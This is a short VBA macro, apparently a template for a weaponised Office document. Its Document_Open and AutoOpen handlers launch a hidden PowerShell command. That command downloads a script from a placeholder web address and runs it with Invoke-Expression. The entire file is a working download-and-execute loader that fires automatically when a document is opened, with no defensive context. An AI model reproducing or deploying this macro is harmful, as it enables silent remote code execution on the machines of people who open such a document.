'download the hosted powershell script with WebClient Request.BinaryRead
'Execute the powershell with Shell Strm vbHide
Sub MyMacro()
	Dim str As String
	str = "powershell (New-Object System.Net.WebClient).DownloadString('http://Ips/yourpowershellname.ps1') | IEX"
	Shell str, vbHide
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub AutoOpen()
	MyMacro
End Sub